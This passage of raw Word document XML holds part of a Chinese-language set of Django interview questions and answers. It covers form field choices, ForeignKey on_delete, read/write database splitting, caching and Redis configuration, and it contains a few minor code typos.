      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>参数，请使用两种方式实现数据源实时更新。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03BE08FA" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.重写构造函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C6AFE24" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800080"/>
        </w:rPr>
        <w:t>__init__</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(self, *args, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA48212" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        super().</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800080"/>
        </w:rPr>
        <w:t>__init__</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(*args, **kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="051EC1F6" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.fields[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"city"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>].widget.choices = models.City.objects.all().values_list(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"id"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"name"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1098847D" w14:textId="174A792D" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.利用ModelChoiceField字段,参数为queryset对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461F6788" w14:textId="292B2900"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028</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的</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Model</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ForeignKey</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>字段中的</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>on_delete</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>参数有什么作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD3A81E" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#删除关联表中的数据时,当前表与其关联的field的操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9FEE9B" w14:textId="6417B88D" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#django2.0之后，表与表之间关联的时候,必须要写on_delete参数,否则会报异常</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="624CFBEB" w14:textId="539016D9"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030</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">django orm </w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中如何设置读写分离？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E694A40" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.手动读写分离:通过.using(db_name)来指定要使用的数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="685257F5" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.自动读写分离:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A05429F" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    1.定义类：如Router</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D9A7D3" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    2.配置Router</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1708303B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>#        settings.py中指定DATABASE_ROUTERS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302F1489" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#        DATABASE_ROUTERS = ['myrouter.Router',] </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1933A217" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#提高读的性能：多配置几个数据库,并在读取时,随机选取。写的时候写到主库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62229E44" w14:textId="034AD0E7" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#实现app之间的数据库分离：分库分表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60424DA0" w14:textId="51036015"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032</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内置的缓存机制？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA8D68D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 全站缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3BE0D9" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>MIDDLEWARE_CLASSES = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162DC7D1" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    ‘django.middleware.cache.UpdateCacheMiddleware’, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#第一</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75574E60" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'django.middleware.common.CommonMiddleware'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3166B495" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">    ‘django.middleware.cache.FetchFromCacheMiddleware’, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#最后</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2A8DC6" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178DB003" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A616B7" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 视图缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC24A17" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.views.decorators.cache </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> cache_page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A12580" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C2894D6" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE2C0F7" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">@cache_page(15)          </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#超时时间为15秒</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05119AE0" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6F405F" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> t=time.time()      </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#获取当前时间</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A052A72" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> render(request,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"index.html"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>,locals())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="733A1826" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16BD679D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 模板缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B3CA49C" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>{% load cache %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6083E5D0" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;h3 style=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"color: green"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&gt;不缓存:-----{{ t }}&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F144131" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0715CC78" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">{% cache 2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'name'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> %} </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 存的key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A51DF00" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;h3&gt;缓存:-----:{{ t }}&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB3B1DC" w14:textId="419E1C68" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>{% endcache %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E07B52" w14:textId="09463859"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033</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的缓存能使用</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>吗？如果可以的话，如何配置？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E7C12B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.安装 pip install django-redis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AEA7A4A" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.在stting中配置CACHES,可以设置多个缓存,根据名字使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106269C3" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        CACHES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A802180" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
